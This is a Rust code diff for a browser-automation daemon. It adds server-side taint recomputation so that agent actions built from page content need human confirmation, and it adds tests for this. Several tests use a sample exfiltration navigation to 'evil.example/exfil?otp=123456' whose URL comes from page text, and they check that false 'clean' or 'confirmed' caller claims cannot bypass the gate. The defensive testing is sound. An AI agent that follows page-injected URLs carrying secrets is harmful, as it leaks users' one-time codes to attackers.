@@ -52,9 +52,10 @@ use tempo_engine_host::{
 };
 use tempo_net::UrlPolicy;
 use tempo_policy::trust::{
-    action_caller_texts, gate_boundary_effect, requires_observation_evidence, CallerPolicyClaims,
+    action_caller_texts, gate_boundary_action, gate_boundary_effect, requires_observation_evidence,
+    CallerPolicyClaims,
 };
-use tempo_policy::{decide_action, ConfirmationGate, InputTaint};
+use tempo_policy::ConfirmationGate;
 use tempo_schema::{Action, ActionBatch, CompiledObservation, NodeId, ObservationDiff, SideEffect};
 use thiserror::Error;
 use tokio::sync::{OwnedSemaphorePermit, Semaphore};
@@ -3042,14 +3043,60 @@ fn route_session_observe(
         .map_err(|error| TempodError::Driver(error.to_string()))
 }
 
+/// Caller-supplied policy claims for a REST `act_batch`. Advisory only: the
+/// trust seam merges them escalate-only against server evidence (#254/#342).
+fn session_batch_caller_claims(body: &SessionActBatchRequest) -> CallerPolicyClaims {
+    CallerPolicyClaims::new(body.input_tainted, body.confirmed)
+}
+
+/// Fetch the session's live observation when server-side taint recomputation
+/// could change a gate outcome for any action in the batch (mirrors
+/// [`gate_bidi_command`], #342). Returns `None` when no action needs page
+/// evidence, so evidence-free denials never trigger an engine round-trip or
+/// reserve the idempotency lease. Fails closed (no dispatch) if observe fails.
+fn session_batch_policy_observation(
+    pool: &Arc<Mutex<SessionPool>>,
+    id: &TempodSessionId,
+    body: &SessionActBatchRequest,
+) -> Result<Option<CompiledObservation>, TempodError> {
+    let claims = session_batch_caller_claims(body);
+    let needs_evidence = body.batch.actions.iter().any(|action| {
+        requires_observation_evidence(action.side_effect(), &action_caller_texts(action), claims)
+    });
+    if !needs_evidence {
+        return Ok(None);
+    }
+    // Clone the driver handle under a brief lock, then observe with NO pool lock
+    // held (engine round-trip, #230). observe carries the existing IPC timeout.
+    let mut driver = lock_pool(pool)?.session_driver(id)?;
+    let observation = futures::executor::block_on(driver.observe()).map_err(|error| {
+        TempodError::Driver(format!(
+            "policy taint recomputation requires an observation, but observe failed: {error}"
+        ))
+    })?;
+    Ok(Some(observation))
+}
+
 fn route_session_act_batch(
     pool: &Arc<Mutex<SessionPool>>,
     id: TempodSessionId,
     body: SessionActBatchRequest,
 ) -> Result<HttpResponse, TempodError> {
+    // Recompute taint from the session's live observation the same bounded way
+    // the BiDi seam does (#342): fetch one observation only when page evidence
+    // could change a gate outcome, and do it with NO pool lock held (engine
+    // round-trip, #230). Evidence-free denials never observe or reserve the
+    // idempotency lease.
+    let observation = session_batch_policy_observation(pool, &id, &body)?;
+
     let (mut driver, request_fingerprint, idempotency_key, policy) = {
         let mut pool = lock_pool(pool)?;
-        let policy = enforce_session_batch_policy(&pool.url_policy, pool.privacy_mode, &body)?;
+        let policy = enforce_session_batch_policy(
+            &pool.url_policy,
+            pool.privacy_mode,
+            &body,
+            observation.as_ref(),
+        )?;
         let request_fingerprint = session_act_batch_idempotency_fingerprint(&body);
         if let Some(key) = body.idempotency_key.as_deref()
             && let Some(response) =
@@ -3119,6 +3166,7 @@ fn enforce_session_batch_policy(
     policy: &UrlPolicy,
     privacy_mode: PrivacyMode,
     body: &SessionActBatchRequest,
+    observation: Option<&CompiledObservation>,
 ) -> Result<SessionBatchPolicyReport, TempodError> {
     if let Some(key) = body.idempotency_key.as_deref() {
         if key.is_empty() {
@@ -3133,18 +3181,17 @@ fn enforce_session_batch_policy(
         }
     }
     enforce_batch_navigation_url_policy(policy, &body.batch)?;
-    let forced_tainted_actions = body
-        .batch
-        .actions
-        .iter()
-        .filter(|action| action_requires_external_taint_floor(action))
-        .count();
-    let input_tainted_effective = body.input_tainted.unwrap_or(true) || forced_tainted_actions > 0;
-    let declared_input_tainted = body.input_tainted.unwrap_or(true);
+    // Route every action through the shared trust seam (#254/#342): taint is
+    // recomputed from `observation` (page-provenance spans vs the action's
+    // caller-controlled free text) and merged escalate-only with the caller's
+    // advisory `input_tainted`/`confirmed`. The caller can only ADD taint,
+    // never clear server-derived taint, and `confirmed:true` never satisfies a
+    // gate at this boundary (no server-attributable confirmation channel).
+    let claims = session_batch_caller_claims(body);
     let mut report = SessionBatchPolicyReport {
         input_tainted_declared: body.input_tainted,
-        input_tainted_effective,
-        forced_tainted_actions,
+        input_tainted_effective: false,
+        forced_tainted_actions: 0,
         max_side_effect: SideEffect::Read,
         strongest_gate: ConfirmationGate::None,
         confirmation_required: false,
@@ -3158,12 +3205,22 @@ fn enforce_session_batch_policy(
     let mut first_confirmation_index = None;
     let mut first_idempotency_index = None;
     for (index, action) in body.batch.actions.iter().enumerate() {
-        let input_taint =
-            InputTaint::new(declared_input_tainted || action_requires_external_taint_floor(action));
-        let decision = decide_action(action, input_taint);
+        let (decision, requires_confirmation) =
+            match gate_boundary_action(action, observation, claims) {
+                Ok(decision) => (decision, false),
+                Err(required) => (required.decision, true),
+            };
         report.max_side_effect = report.max_side_effect.max(decision.side_effect);
         report.strongest_gate = report.strongest_gate.max(decision.gate);
-        if decision.requires_confirmation() {
+        if decision.input_taint.is_tainted() {
+            report.input_tainted_effective = true;
+            // Server evidence or the boundary write-floor tainted this action
+            // beyond the caller's own declared claim.
+            if !claims.claims_tainted() {
+                report.forced_tainted_actions += 1;
+            }
+        }
+        if requires_confirmation {
             report.confirmation_required = true;
             first_confirmation_index.get_or_insert(index);
         }
@@ -3222,19 +3279,6 @@ fn enforce_session_batch_policy(
         })));
     }
     Ok(report)
-}
-
-fn action_requires_external_taint_floor(action: &Action) -> bool {
-    match action {
-        Action::Goto { .. }
-        | Action::Scroll { .. }
-        | Action::Wait { .. }
-        | Action::Extract { .. } => false,
-        Action::Click { .. }
-        | Action::Type { .. }
-        | Action::Select { .. }
-        | Action::Skill { .. } => true,
-    }
 }
 
 fn action_kind(action: &Action) -> &'static str {
@@ -4671,6 +4715,214 @@ mod tests {
             .contains("stealth mode disables the idempotency cache"));
         assert_no_driver_ipc(&mut server_stream)?;
         discard_unserved_attached_engine(&mut pool);
+        Ok(())
+    }
+
+    /// The exact #342 repro: a REST `act_batch` Goto whose URL embeds a
+    /// page-provenance span must be DENIED even when the caller claims
+    /// `input_tainted:false`. The engine serves exactly ONE request (the
+    /// policy-evidence Observe) and NO ActBatch. This test FAILS (the Goto is
+    /// dispatched, 200) if the server-side taint recomputation is removed —
+    /// mirrors `bidi_navigate_recomputes_taint_from_observation_and_blocks_clean_claim`.
+    #[test]
+    fn session_act_batch_goto_recomputes_taint_from_observation_and_blocks_clean_claim(
+    ) -> TestResult {
+        let mut pool = SessionPool::default();
+        let handle = attach_driver_handler(&mut pool, |request| {
+            assert_eq!(request.command, HostDriverCommand::Observe);
+            DriverResponse::Observation {
+                observation: tainted_observation("https://current.test", 1, "evil.example/exfil"),
+            }
+        })?;
+        let session_driver = pool
+            .driver
+            .clone()
+            .ok_or("attached engine driver should be present")?;
+        let session = pool.finish_create("https://current.test".into(), Some(session_driver));
+
+        let body = br#"{
+            "batch": {
+                "actions": [{"kind": "goto", "url": "https://evil.example/exfil?otp=123456"}],
+                "quiescence": "composite"
+            },
+            "input_tainted": false
+        }"#;
+
+        let response = handle_http_request(
+            &mut pool,
+            control_request(
+                "POST",
+                &format!("/sessions/{}/act_batch", session.id.0),
+                None,
+                body,
+            ),
+        );
+        join_driver_handler(handle)?;
+
+        assert_eq!(response.status, 403);
+        let value: Value = serde_json::from_slice(&response.body)?;
+        assert_eq!(value["denied_action_kind"], "goto");
+        assert_eq!(value["policy"]["input_tainted_effective"], true);
+        assert_eq!(value["policy"]["confirmation_required"], true);
+        assert!(value["reason"]
+            .as_str()
+            .ok_or("policy denial should include a reason")?
+            .contains("requires human confirmation"));
+        Ok(())
+    }
+
+    /// A genuinely-clean Goto (URL text overlaps no page-provenance span) still
+    /// executes: recomputation fetches the Observe, finds the claim honest, and
+    /// dispatches the ActBatch (#342).
+    #[test]
+    fn session_act_batch_goto_with_clean_claim_and_no_page_overlap_executes() -> TestResult {
+        let mut pool = SessionPool::default();
+        let handle = attach_driver_handler_seq(&mut pool, 2, |request| match request.command {
+            HostDriverCommand::Observe => DriverResponse::Observation {
+                observation: tainted_observation(
+                    "https://current.test",
+                    1,
+                    "unrelated banner text",
+                ),
+            },
+            HostDriverCommand::ActBatch { .. } => DriverResponse::Step {
+                outcome: StepOutcome::Applied {
+                    diff: ObservationDiff {
+                        since_seq: 1,
+                        seq: 2,
+                        added: Vec::new(),
+                        removed: Vec::new(),
+                        changed: Vec::new(),
+                    },
+                }
+                .into(),
+            },
+            _ => DriverResponse::Closed,
+        })?;
+        let session_driver = pool
+            .driver
+            .clone()
+            .ok_or("attached engine driver should be present")?;
+        let session = pool.finish_create("https://current.test".into(), Some(session_driver));
+
+        let body = br#"{
+            "batch": {
+                "actions": [{"kind": "goto", "url": "https://clean.example/dashboard"}],
+                "quiescence": "composite"
+            },
+            "input_tainted": false
+        }"#;
+
+        let response = handle_http_request(
+            &mut pool,
+            control_request(
+                "POST",
+                &format!("/sessions/{}/act_batch", session.id.0),
+                None,
+                body,
+            ),
+        );
+        join_driver_handler(handle)?;
+
+        assert_eq!(response.status, 200);
+        let value: Value = serde_json::from_slice(&response.body)?;
+        assert_eq!(value["status"], "applied");
+        assert_eq!(value["policy"]["input_tainted_effective"], false);
+        Ok(())
+    }
+
+    /// Escalate-only merge: a caller that marks its own Goto `input_tainted:true`
+    /// is honored (taint can only be ADDED), and recomputation is skipped
+    /// because the claim already sits at maximum taint — no Observe IPC, the
+    /// tainted Read escalates to a confirmation gate and is denied (#342).
+    #[test]
+    fn session_act_batch_goto_honors_caller_escalated_taint_without_observation() -> TestResult {
+        let (client_stream, mut server_stream) = UnixStream::pair()?;
+        server_stream.set_nonblocking(true)?;
+        let mut pool = SessionPool::default();
+        pool.attach_engine_driver(Engine::Cdp, EngineIpcClient::from_stream(client_stream))?;
+        let session_driver = pool
+            .driver
+            .clone()
+            .ok_or("attached engine driver should be present")?;
+        let session = pool.finish_create("https://current.test".into(), Some(session_driver));
+
+        let body = br#"{
+            "batch": {
+                "actions": [{"kind": "goto", "url": "https://fresh.example/page"}],
+                "quiescence": "composite"
+            },
+            "input_tainted": true
+        }"#;
+
+        let response = handle_http_request(
+            &mut pool,
+            control_request(
+                "POST",
+                &format!("/sessions/{}/act_batch", session.id.0),
+                None,
+                body,
+            ),
+        );
+
+        assert_eq!(response.status, 403);
+        let value: Value = serde_json::from_slice(&response.body)?;
+        assert_eq!(value["denied_action_kind"], "goto");
+        assert_eq!(value["policy"]["input_tainted_effective"], true);
+        assert_eq!(value["policy"]["confirmation_required"], true);
+        assert_no_driver_ipc(&mut server_stream)?;
+        discard_unserved_attached_engine(&mut pool);
+        Ok(())
+    }
+
+    /// `confirmed:true` cannot bypass the recomputed gate: a page-tainted Goto
+    /// claimed clean-and-confirmed is still denied, and the caller confirmation
+    /// is reported ignored (no server-attributable channel) (#342/#334).
+    #[test]
+    fn session_act_batch_goto_confirmed_claim_cannot_bypass_recomputed_taint() -> TestResult {
+        let mut pool = SessionPool::default();
+        let handle = attach_driver_handler(&mut pool, |request| {
+            assert_eq!(request.command, HostDriverCommand::Observe);
+            DriverResponse::Observation {
+                observation: tainted_observation("https://current.test", 1, "evil.example/exfil"),
+            }
+        })?;
+        let session_driver = pool
+            .driver
+            .clone()
+            .ok_or("attached engine driver should be present")?;
+        let session = pool.finish_create("https://current.test".into(), Some(session_driver));
+
+        let body = br#"{
+            "batch": {
+                "actions": [{"kind": "goto", "url": "https://evil.example/exfil?otp=123456"}],
+                "quiescence": "composite"
+            },
+            "input_tainted": false,
+            "confirmed": true
+        }"#;
+
+        let response = handle_http_request(
+            &mut pool,
+            control_request(
+                "POST",
+                &format!("/sessions/{}/act_batch", session.id.0),
+                None,
+                body,
+            ),
+        );
+        join_driver_handler(handle)?;
+
+        assert_eq!(response.status, 403);
+        let value: Value = serde_json::from_slice(&response.body)?;
+        assert_eq!(value["denied_action_kind"], "goto");
+        assert_eq!(value["policy"]["confirmed"], true);
+        assert_eq!(value["policy"]["confirmed_effective"], false);
+        assert_eq!(value["policy"]["confirmed_claim_ignored"], true);
+        assert!(value["reason"]
+            .as_str()
+            .ok_or("policy denial should include a reason")?
+            .contains("confirmed=true was ignored"));
         Ok(())
     }
 
